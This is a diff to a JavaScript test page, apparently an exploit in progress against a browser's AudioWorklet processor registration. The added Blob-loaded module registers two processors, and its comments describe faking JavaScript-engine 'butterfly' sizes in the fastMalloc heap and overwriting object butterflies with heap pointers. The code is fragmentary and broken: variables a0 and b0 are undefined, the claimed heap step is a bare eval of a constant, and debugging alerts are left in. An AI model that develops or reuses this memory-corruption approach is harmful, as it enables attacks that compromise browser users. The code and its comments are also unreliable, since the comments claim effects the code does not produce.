@@ -5,12 +5,29 @@ var offctx = new OfflineAudioContext(1,128,300000);
 //alert(objectURL)
 alert(audioContext)
 //alert(audioContext.audioWorklet)
-offctx.audioWorklet.addModule(URL.createObjectURL(new Blob([`alert("hey")`],{type:'text/javascript'})));
+offctx.audioWorklet.addModule(URL.createObjectURL(new Blob([`
+alert("hey");
+registerProcessor("a", class {
+        constructor() {
+          // setup a message port to the main thread
+          //port = new AudioWorkletProcessor().port;
+          // this part is magic
+          // put 0xfffe000000001337 in the fastMalloc heap to fake the butterfly sizes
+          eval('1 + 0x1336');
+          // overwrite a1's butterfly with a fastMalloc pointer
+          return {fill: 1, a: a0};
+        }
+      });
+registerProcessor("b", class {
+        constructor() {
+          // overwrite b1's butterfly with a fastMalloc pointer
+          return {fill: 1, b: b0};
+        }
+      });
+
+     
+`],{type:'text/javascript'})));
 alert("hey")
-const node = new AudioWorkletNode(audioContext, 'test-processor');
-node.registerProcessor('test-processor', class {
-  constructor() {
-    return {foo: 'bar'};
-  }
-});
+var node1 = new AudioWorkletNode(audioContext, 'a');
+var node2 = new AudioWorkletNode(audioContext, 'b');
 </script>
